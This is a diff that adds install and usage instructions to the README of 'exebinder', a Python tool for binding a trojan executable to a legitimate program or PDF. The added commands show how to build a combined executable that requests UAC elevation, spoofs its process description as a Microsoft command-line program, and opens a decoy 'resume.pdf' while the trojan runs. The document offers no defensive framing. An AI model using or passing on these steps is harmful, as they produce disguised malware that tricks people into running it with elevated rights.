@@ -28,3 +28,37 @@ I suggest before use this tool, you may check the architecture of the secondary 
 例如：如果是Windows 80386 的 console 程序，则需要指定--x86 和 --no-gui 参数。
 
 For example, if the secondary file is Windows 80386 console program, you need run `python exebinder.py` with `--x86` and `--no-gui` flags.
+
+## Install
+
+### Install Python2.7
+
+### Install tdm-gcc
+
+From: https://jmeubank.github.io/tdm-gcc/download/
+
+And then make sure that gcc/g++/windres is on your Windows %PATH% environment variables.
+
+### Use exebinder
+
+`python exebinder.py --help`
+
+Bind trojan.exe with xxx.exe which is a CLI program with UAC permission, and new.exe is be generated. When new.exe is running, you can see the process description is "Microsoft Windows Command Line Program".
+
+`python exebinder.py --uac --no-gui --dec "Microsoft Windows Command Line Program" xxx.exe trojan.exe` --out new.exe 
+ 
+Bind trojan.exe with xxx.exe which is a GUI program and x86 architecture.
+
+`python exebinder.py --x86 xxx.exe trojan.exe --out new.exe`
+
+Bind trojan.exe with xxx.pdf and UAC permission. When new.exe running, the default pdf reader openning for reading the xxx.pdf, which name is be changed resume.pdf at runtime.
+
+`python exebinder --prog resume.pdf --uac xxx.pdf trojan.exe --out new.exe`
+
+
+### TODO
+
+I will add the feather of auto check the file type, so the --x86 and --no-gui parameter may be depreciated.
+
+
+
